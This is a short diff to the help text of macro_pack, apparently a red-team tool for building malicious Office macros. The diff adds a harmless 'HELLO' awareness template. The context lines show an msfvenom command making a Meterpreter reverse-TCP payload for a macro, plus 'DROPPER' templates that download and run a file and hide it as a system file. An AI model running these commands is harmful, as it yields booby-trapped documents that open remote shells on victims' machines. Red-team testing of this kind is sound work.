@@ -160,6 +160,8 @@ msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macr
         Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
     -t, --template=TEMPLATE_NAME 
         Available templates:
+        	HELLO   -> Just print a hello message and awareness about macro
+                    -> Example use: echo "@EmericNasi" | %s -t HELLO -P hello.pptm
             DROPPER -> Download and exec file
                     -> Example use:  echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER -o -x dropper.xls
             DROPPER2 -> Download and exec file. File attributes are also set to system, readonly, and hidden
